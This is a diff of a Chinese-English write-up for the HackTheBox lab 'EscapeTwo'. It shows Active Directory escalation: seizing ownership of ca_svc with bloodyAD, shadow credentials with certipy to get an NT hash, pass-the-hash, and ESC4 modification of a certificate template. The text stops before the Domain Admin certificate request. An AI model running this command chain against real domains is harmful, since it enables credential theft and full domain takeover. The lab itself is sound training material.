@@ -1,4 +1,5 @@
 ## EscapeTwo
+####  ESC4
 ```
 [★]$ nmap -sC -sV 10.129.63.253 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-16 02:18 CST
@@ -565,21 +566,153 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 #### 此操作失败，因为 ryan 当前不是 ca_svc 的所有者。Bloodhound 显示它是域管理员组Owns
 #### 将使用BloodyAD将 ryan 设置为所有者，然后授予 ryan 完全控制权限：
 ```
+[★]$ sudo ntpdate 10.129.72.89
+2026-01-24 03:21:04.906952 (-0600) -0.401579 +/- 0.004715 10.129.72.89 s1 no-leap
+[★]$ sudo su
 #pipx install --force bloodyAD
   installed package bloodyad 2.5.3, installed using Python 3.11.2
   These apps are now globally available
     - bloodyAD
     - bloodyad
 done! ✨ 🌟 ✨
-```
 
-```
-#bloodyAD -d sequel.htb --host 10.129.69.59 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+#bloodyAD -d sequel.htb --host 10.129.72.89 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan 
 [+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
-#bloodyAD -d sequel.htb --host 10.129.69.59 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
-Traceback (most recent call last):
-  File "/root/.local/bin/bloodyAD", line 8, in <module>
-    sys.exit(main())
-             ^^^^^^
+#bloodyAD -d sequel.htb --host 10.129.72.89 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+[+] ryan has now GenericAll on ca_svc
+
+#certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.72.89
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '5f129a79-75b9-5117-3e6e-7a36fe74b3ab'
+[*] Adding Key Credential with device ID '5f129a79-75b9-5117-3e6e-7a36fe74b3ab' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID '5f129a79-75b9-5117-3e6e-7a36fe74b3ab' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Using principal: ca_svc@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
+
+[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
+
+ #netexec smb dc01.sequel.htb -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
+SMB         10.129.72.89    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.129.72.89    445    DC01             [+] sequel.htb\ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce
 ```
+### Shell as Administrator
+#### ADCS Enumeration
+```
+#certipy find -vulnerable -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip  10.129.72.89 -stdout
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'sequel-DC01-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC01-CA
+    DNS Name                            : DC01.sequel.htb
+    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
+    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
+    Certificate Validity End            : 2124-06-08 17:00:40+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : DunderMifflinAuthentication
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectRequireCommonName
+                                          SubjectAltRequireDns
+    Enrollment Flag                     : AutoEnrollment
+                                          PublishToDs
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Cert Publishers
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
+```
+#### which ca_svc is a member of 
+#### ESC4适用于证书模板上存在弱访问控制的情况。上面的输出显示Certificate Publishers组完全控制Dunder Mifflin身份验证模板。Red&Blue Team Security的这篇文章详细介绍了如何利用这个漏洞。
+
+#### 我将使用我对模板的控制，使其容易受到ESC1的攻击，然后利用它。
+
+#### 从EscapeTwo发布（Certipy版本4.8.2）到本文发布（Certipy 5.0.2）期间，利用这个漏洞的命令发生了变化。我将展示两者。
+```
+因为ca_svc对模板有完全的控制，我将使用以下选项使用证书使其易受ESC1攻击：
+
+Template -用于读取和修改模板的命令
+-u ca SVC -要验证的用户名
+-hash <hash> -要验证的用户的哈希值
+- DC -ip <ip> -目标数据中心ip
+-template <模板名称> -目标模板
+-target <dc主机名> -目标机器
+-save-old 保存旧模板的副本以便恢复
+
+#certipy template -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.72.89 -template DunderMifflinAuthentication -target dc01.sequel.htb -save-old
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
+[*] Updating certificate template 'DunderMifflinAuthentication'
+[*] Successfully updated 'DunderMifflinAuthentication'
+```
+#### 现在我可以使用修改后的模板申请域管理员证书了：
+
 
